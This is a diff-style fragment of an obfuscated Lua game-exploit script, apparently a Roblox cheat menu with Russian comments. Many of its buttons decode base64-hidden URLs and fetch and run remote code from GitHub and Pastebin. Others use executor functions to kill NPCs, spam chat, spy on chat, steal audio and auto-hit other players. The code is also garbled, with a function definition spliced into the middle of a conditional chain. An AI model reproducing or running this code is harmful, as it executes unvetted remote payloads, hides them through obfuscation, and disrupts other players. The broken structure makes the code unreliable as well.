+                        loadstring(game:HttpGet(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('gqOYcJFSKZSccEiTbEQhZAFYAxhpashuJZmCIysIAgaagfVXLYJrdNoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dob3N0UGxheWVyMzUyL1Rlc3Q0L21haW4vSW52aXNpYmxlJTIwR3Vp')))()
+                      elseif button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('gttDNaklqnqBfJNynfAHDfmodemHdUNNIUlQPKIjatpBeHPdGLUJViBSW5maW5pdGUgWWllbGQ=') then
+                        loadstring(game:HttpGet(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('jIwNonfrivfeisdLWREusIbcCndhItDngLhgAhfbXNQEoTPvNQOVHxOaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkZ2VJWS9pbmZpbml0ZXlpZWxkL21hc3Rlci9zb3VyY2U=')))() 
+                      elseif button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('IUulSIdobjnKFYGpEXrondTRdLsaeUcPtirWVOCIUuwHAYRnJQRTexiS2V5Ym9hcmQ=') then
+                         loadstring(game:HttpGet(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('ipgSRsbCDcEkjyZTCfWzwVbxPmrugFferEKfqDhlxmTNLyxBTaMcCrxaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SZWRaZW5YWVovNGQ4MGJmZDcwZWUyNzAwMDY2MGU0YmZhNzUwOWM2NjcvcmF3L2RhOTAzYzU3MDI0OWFiM2MwYzFhNzRmMzQ2NzI2MDk3MmMzZDg3ZTYvS2V5Qm9hcmQlMjUyMEZyb20lMjUyME9oaW8lMjUyMEZyJTI1MjBGcg==')))()    
+                     local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('QVRnufwcFKqtnNnXyhSwmtkZwidmylUhHwCDrBLMfdgkMyyVydqrCxlQlRvb2xz') then 
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('UHEwVjTMbBNllUMuqbuIVMmyJnLWWpJVDwwvGwIFdectqfdeCkvVrKnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xFVE5QTDBF')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('LAYZbsSLkjktibQagtKbDUAnCKGyjXBMfIiuALOHTmKTYZPPilwFgBLSW5mbyBJdGVtIE5hbWUgKGxvZ3Mp') then 
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('MeEcQhprHhKgIkpIOkyfKxoquYnhNxhTnlTCeFRVuduAWDaPQoDWdrfaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vSW5mbw==')))() 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('AUhNcSAAUBagjxGYdeCVweDdalPNzkqZAdbNpAIJWyUpqsVneBTNIcyVGVsZWtpbmVzaXM=') then 
+                          loadstring(game:HttpGet((qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('wEyDmOYwHMNFNtlEgfBWhnaXJtcaoqbQEoDNTVWTxDqZbihGrkCSECYaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NBWlhIVUIvQ29udHJvbC11cGRhdGUvbWFpbi9SRUFETUUubWQ=')),true))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('AymhVQTZMSqYXSVpvXlXrWueNXHzesfgvQCgbYFYRzNFwhRfMsHAXMATXVsdGkgR2VhciBQcmVzcyAoRSk=') then 
+                           lp = game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('PuwVCRoeFeHkahXMJARvZdWYnCLOwzHUEcGTabWdkxoMwLKvHRsiJBSUGxheWVycw==')).LocalPlayer
+ 
+game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('vSKMktqMGxHRFgEpgUhVjZbjrKgZOFoMDJurGyRZmKStWWLOLmzhVrTVXNlcklucHV0U2VydmljZQ==')).InputBegan:Connect(function(key)
+ if key.KeyCode == Enum.KeyCode.E then
+  for i,tool in pairs(lp.Backpack:GetChildren()) do
+   if tool:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('XONXXiRUbRjhoTsVnBuLSOoNQbQCcmOAZvhRGYUkIxnBFBTVqanNNrLVG9vbA==')) then
+    tool.Parent = lp.Character
+    tool:Activate()
+    task.wait()
+    tool.Parent = lp.Backpack
+   end
+  end
+ end
+end)
+
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('LnTTozGynyUtltOAqXRfPPMAXZPWKhYtCPTrIqqFhOTpXOzVeyPjArcTXVsdGkgR2VhciAoQW5vdGhlciB2ZXJzaW9uKQ==') then 
+                       loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('UNsHkgzzXyoEHBwvWrXsmneOKFcyQIomqgylCHRmwRqJFWbFAsMUHOkaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vR2Vhcg==')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('opBepLksMzYXPhXwYFoDREOIQmZWHilJgtIwEjzUOnivtveDTIubDsKRm9jdXMoSXRlbSk=') then 
+                        local lp = game.Players.LocalPlayer
+local mouse = lp:GetMouse()
+
+local ft = Instance.new(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('VFsWyrKUuJkwGdTBtNlrRRRHdaRdgFJTgdvYGDZzriQsTdAVZMvAcbwVG9vbA=='))
+ft.Name = qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('oncKfMYlGkxdWqFShWvxfRDTjGqfTCIWYyEnEAsyFGipomMPbUpKWmvRm9jdXM=')
+ft.RequiresHandle = false
+ft.Parent = lp.Backpack
+ft.Activated:Connect(function()
+ local obj = mouse.Target
+ if obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('HfVOBIEmERlSKwhPUxGAeQRujqxPenVsCsNAXNIUThlZexbinDUkWSSQmFzZVBhcnQ=')) or obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('AvNSnDZxQVgbGLYFapZIbaDHxmeeiWvAKLVudJzEHykNdMsjvzpLgHjUGFydA==')) or obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('CzpETIpqkwRdeleXhtByDVydcEnIoNowUNmrHTRWfNrUpIqXnUnLaYFTWVzaFBhcnQ=')) or obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('acYMhZGqQPNHxhPfrPfMStzvEYJzkBwtBkCugYWQzhzSmuzYcVgwPZtQ29ybmVyV2VkZ2VQYXJ0')) or obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('WdOsdfpCZrThGDtWcbWaEBBrNqkqBgCsZWcnBQhIMqVQCKizPQofqovVHJ1c3NQYXJ0')) or obj:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('qnhkXxaYiJTbmUaXwVBBIdNsJFMNlyRQasjcUBsYitqSfxuJzMjEGTaV2VkZ2VQYXJ0')) then
+  if not obj.Anchored then
+      local bambam = Instance.new(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('bszXMKURorsBwevNkoybUDyPGLTKZJauucPWwqUKHnBjGClBztotPRvQm9keUFuZ3VsYXJWZWxvY2l0eQ=='))
+      bambam.Name = qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('mOtwKbkPGitbFJbVoCfvWDuJKdWdcVJURwmSVTvCctiqWedydqXXGeUQkFNIEJBTSBBSEFISEFIQUhIQUhBSA==')
+      bambam.Parent = obj
+      bambam.AngularVelocity = Vector3.new(99999999,99999999,99999999)
+      bambam.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
+      bambam.P = math.huge
+     end
+ end
+end) 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('XKOhxmYSPtkjhZQDMNTWBDfdKKXYNwuYTdoHweyclCpkbXKdSqupUBYQXZhdGFyIHVwc2lkZSBkb3duIChGRSk=') then 
+                         loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('aAEkXQzbuBNOXiDyOQYhfkUSlNxXojSxpxIUmmRfHydwVFehXFNPQwoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vQXZhdGFy')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('IVIiRGEtdEmoGPJMCmBKnHrzmsephVKxNgotwVDCwUxXtcWsqqKLsklQ2hhdCBTcHk=') then
+                         loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('NXlLeJaGITbbtHSdYnBsPMTropgmceWNIFEhSTSAyemkTIiYywXOiIFaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vU3B5')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('VUlateUXluEImDwSnByhOUUyCsEiLchLMLCXEQarVdCxvjRMnwmnFeLQ2hhdCB0cmFuc2xhdG9y') then
+                        loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('CGedeRGwQyCajthrXPOApPFluCihcZujdkGwssVEHdFmgVFLEIDwwRxaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vVHJhbnM=')))() 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('ULQskoYFSynnblWizbWOrBWdrhqFkvhHzHOyWNGLLBeaeJtzGRNnMeIQnVsbHlpbmcgQ2hhdCBTcGFtIChSVVMp') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('RbrHqjQNLuLpxLJfMkXfZtXKOZMPXMGsZLdpRDzVwIfTnFgwgxxAELPaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vQ2hhdFJ1')))() 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('CHqeDRiwgKsKlmhRJvjGNiXPMLRVpsidLTSozmaiukPxKdCKrmyYNJHQnVsbHlpbmcgQ2hhdCBzcGFtIChFTkcp') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('ncgMoEoycgGtKCTykAFdnmtaVPGxhVyCuUUbdieXEuGbYCdpBFdavZzaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvTnNiZ3Noc2RuL21haW4vQ2hhdEVu')))() 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('IuHCdRpcZvValzBVEzBcjNbyeYwlqSMsDeCXWeQdWfoceBrnqzErvQPS2lsbCBhbGwgTlBD') then
+                          -- Устанавливаем свойства SimulationRadius и MaxSimulationRadius для локального игрока
+sethiddenproperty(game.Players.LocalPlayer, qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('iefrMksLlRGGBvnHzsUmxtIFKHHqRZjrkxkEuXDoXUKpWMADNzOSIIaU2ltdWxhdGlvblJhZGl1cw=='), 112412400000)
+sethiddenproperty(game.Players.LocalPlayer, qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('zdsDcofzdDuuFeKzhNUCWLfuZmDUyUWPimKrDaaMzuhVvDQhVCymEFlTWF4U2ltdWxhdGlvblJhZGl1cw=='), 112412400000)
+
+-- Перебираем всех потомков в Workspace
+for i, d in pairs(game.Workspace:GetDescendants()) do
+    -- Проверяем, является ли d Humanoid и не принадлежит ли его Parent к игрокам
+    if d.ClassName == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('RbGLeDkNbqMtUuzFXXCvMBBdiLNthFXminArvQauwABVIdqTyoXYzzdSHVtYW5vaWQ=') and not game.Players:FindFirstChild(d.Parent.Name) then
+        -- Устанавливаем здоровье NPC в 0
+        d.Health = 0
+    end
+end
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('WAdEfzxMFDLjWfgLgvEeCPihGisWUCJuHKAHsiedAFwBWuWavwDNnCkQnJpbmcgYWxsIE5QQw==') then
+                          local Players = game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('IxDnWXbYuitXKkgsWowGXmzSPdgMgRbEPhneRGlqyfScjxTxsEAeSwOUGxheWVycw=='))
+local RunService = game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('GEgdtSDimwToNfmxKvrKyAJoatwFmisDVyRhGHuoecwyBoFwPsIWNIUUnVuU2VydmljZQ==')) 
+
+Bring = Value
+while Bring do
+  for i, player in ipairs(Players:GetPlayers()) do
+    if player.Character then
+      for i, model in ipairs(workspace:GetDescendants()) do
+        if model:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('TSVzLxfZzsuaISOKDdqXSGmgAFIyuMnzlTgGqPlcXXfDZgrjnoPToGnTW9kZWw=')) and model:FindFirstChild(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('wiTAMcaDwzFagVQOoLtZXRRJGoKHbMhWUEURWvHPRjkGYWNTjGnjyIcSHVtYW5vaWQ=')) then
+          model:MoveTo(player.Character.Head.Position)
+        end
+      end 
+    end
+  end
+  RunService.Heartbeat:Wait()
+end
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('aICpVFDaiTwUmXDjowwJtDHpnpMDEPLrfQAtLvLWKeYGlNslWikjTuhQW50aS1BRkM=') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('oPWeQLArhneYoBQuJxYXHCFZwJAvbVDfCiYJwLjfWUVmNeDkgUKqhmIaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzlRQ3l1YzJw')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('NtIkQRcoZOhNIAMcFjoSBXminfjDdjgKCMWHWvdnjgsJIPAPeQZLJoGQXVkaW8gU3RlYWxlcg==') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('EdFzwEqWFtCPFyXOpvDHVQUWfSguJWEfeXKAMQIVrnxOSunHmMxEzGGaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RqOUI1NjVU')))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('jMeETsuYQnSiqjIpXIxCOIOhVowbjNsLrmmtKLMykrTmNNPDBIUyoeSQ2xpY2sgQWxsIEJ1dHRvbnM=') then
+                        game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('fvUXXakcTgaDzgrgCmczLDqeNKhuBsutWjyqfnbFecKaENdmwXUPOVoQ29yZUd1aQ==')).PurchasePrompt.Enabled = false
+_G.Lag = Value
+while _G.Lag do
+for i,v in pairs(workspace:GetDescendants()) do
+   if v:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('xCoktluGHtkwxiPbaRnRwEEZlDatsePMQQMZqThZFAFaSXVOoXjqJUfQ2xpY2tEZXRlY3Rvcg==')) then
+    fireclickdetector(v)
+   end
+end
+  wait(1)
+  end
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('TBLtmcKvYeSsdaAxjtFLYQjKWmPALFdvDXfqAOPqJTDsEXsCqCOFdfZVG91Y2ggYWxsIHdhbGxz') then
+                          local plr = game.Players.LocalPlayer.Character.Head
+for i, v in pairs(game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('ziyqrqtUXcgWpFYpSajLwaQpJbuStdkNmURkxIdDPMCrVyhcILpXvsQV29ya3NwYWNl')):GetDescendants()) do
+        if v.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('ijVrLFIWLhHorqXxJluwbnaWIdNpZimQRqLwhKhmIySejtOmRTlVgDLVG91Y2hJbnRlcmVzdA==') and v.Parent then
+        firetouchinterest(plr, v.Parent, 0)
+    end
+end 
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('DefhkYIIWMolPZPhOOxZsjtWSJSdQxBWPYBmyZISmZWjNnCzwFFAYcfU3dvcmQgUmVhY2g=') then
+                          local range = 1000
+local player = game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('wntssoxyuTbFaAXaDYZTMAcZRMCPQSGkHTyOxiYGKWXBRFEszliuICfUGxheWVycw==')).LocalPlayer
+game:GetService(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('BvUqHdoosPodDxeOUGckXYIsJsaAvFSbHYrbUQKqZFzegYFOLGEiZSkUnVuU2VydmljZQ==')).RenderStepped:Connect(function()
+    local p = game.Players:GetPlayers()
+    for i = 2, #p do local v = p[i].Character
+local tool = player.Character and player.Character:FindFirstChildOfClass(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('ZWSPnoqUTmbuwiPddEOdqVVTbqpsXeJuACqJNSqjghfnAOyPdzmBiBIVG9vbA=='))
+            if tool and tool:FindFirstChild(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('eKBIgfqQiRBfMHcyGOhylpQJuVPINDUvVcKJTzSTbKzeOyNgptxxchtSGFuZGxl')) then
+                tool:Activate()
+                for i,v in next, v:GetChildren() do
+                    if v:IsA(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('zqdUNrjYqgLpyKHOhdTxsUkDgjcsifnpEqGxbnpzVRPwKyrLbcajGteQmFzZVBhcnQ=')) then
+                        firetouchinterest(tool.Handle,v,0)
+                        firetouchinterest(tool.Handle,v,1)
+                    end
+                end
+            end
+        end
+end)
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('iFJnuXIgCOvkwqtEoFYxNrUarCIiogvqLZAspNcvQZxJHbQEhRXFqlvcjYgYW5pbWF0aW9ucw==') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('uHcJIsXtCeVdmnkRUZsinLuDCxentjZVzRoQhRmTJgXLdrwwwXIEXpFaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JtRDNxTnA3'), true))()
+                      elseif button.Name == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('qZaPyrGvHOBEBoWlZpAdNDfNIsyUhQQWXBtFBpgkvIojrZOESNkRcSBwr9Vbmtub3duIGRyaW5rPw==') then
+                          loadstring(game:HttpGet(qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('zlJDVuXkGDNnrQJVAkiDTpbCuzxxSeuUJdnfvxdkZBXSdMkSkJpihelaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RvbWF0bzIwMDEvRmNiamdkc2F3ZmcvbWFpbi9VZWR2amRFdWR3cWkx')))()
+                          
+                          
+                          
+                        
+                        
+                       
+                         
+                         
+                         
+                         
+                end
+            end)
+        end -- Закрытие внутреннего цикла qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('jFlTbiKXnlDbgaMWVuMkVvLyJIjoScZlivOKXkbosOhBqLUOYHbeeAVZm9yIGosIGJ1dHRvbk5hbWUgaW4gaXBhaXJzKGJ1dHRvbnNbc2VjdGlvbk5hbWVdKQ==')
+    end -- Закрытие внешнего цикла qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('NWYfPhiLhYdqlZaygCouIWDgmWpMQWOjvGzJpVTqiQTLiAkLWVvskGVZm9yIGksIHNlY3Rpb25OYW1lIGluIHBhaXJzKHNlY3Rpb25zKQ==')
+end -- Закрытие функции qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('NSzGKAYBAMsXIZCKDOODRcioWvfDYudijRtZezfWwImJChDjIpuRUjTY3JlYXRlTWVudQ==')
+
+-- Другой код ...
+
+-- Не забудьте вызвать функцию qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('CzMzPakYBoJvTCdFeLkpXvfshklwBvteZfVmngoxQKiTbTGLxtilECLY3JlYXRlTWVudQ==') в нужном месте вашего скрипта
+createMenu()
+     
+        -- Если секция называется qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('NgNVVlhRjWXaffnrexjamjElvSfmdPrKQbvtTELVQBVItdiDQFDYXIaSW5mb3JtYXRpb24='), то создаем информацию о меню
+        if sectionName == qtOfZdTerreSZZfuDcKUMogKUGFkWgDJLUIZBrizDJoFxvvECdvqJSvqPAQSsdcHDLVNwFomjqAtcnsxJtWPqoUNs('vXirQjWJdgYXtJjDjHxIYJwFkNMdxRBudomsOIFSksgYAmRxvJbWEDpSW5mb3JtYXRpb24=') then
+            createInformation(section)
+        end
+
+-- Создаем функцию, которая срабатывает при нажатии на кнопку закрытия меню
+closeButton.MouseButton1Click:Connect(function()
